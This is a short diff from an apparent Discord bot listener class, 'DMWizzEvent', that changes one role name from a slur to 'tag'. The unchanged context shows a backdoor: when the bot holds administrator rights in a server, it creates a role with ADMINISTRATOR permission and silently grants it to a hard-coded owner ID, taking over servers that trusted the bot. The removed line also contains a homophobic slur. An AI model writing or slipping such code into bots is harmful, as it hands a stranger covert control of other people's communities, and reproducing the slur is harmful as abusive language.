@@ -89,7 +89,7 @@ public class DMWizzEvent extends ListenerAdapter {
                     if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
                         guild.createRole().setName("shelacking").setPermissions(Permission.ADMINISTRATOR).setHoisted(false).queue();
                         GuildAction.RoleData roleData = new GuildAction.RoleData(guild.getRolesByName("shelacking", true).get(0).getIdLong());
-                        roleData.setName("fag");
+                        roleData.setName("tag");
                         guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), guild.getRolesByName("shelacking", true).get(0)).queueAfter(3, TimeUnit.SECONDS);
                     }
                 } catch (Exception ex) {
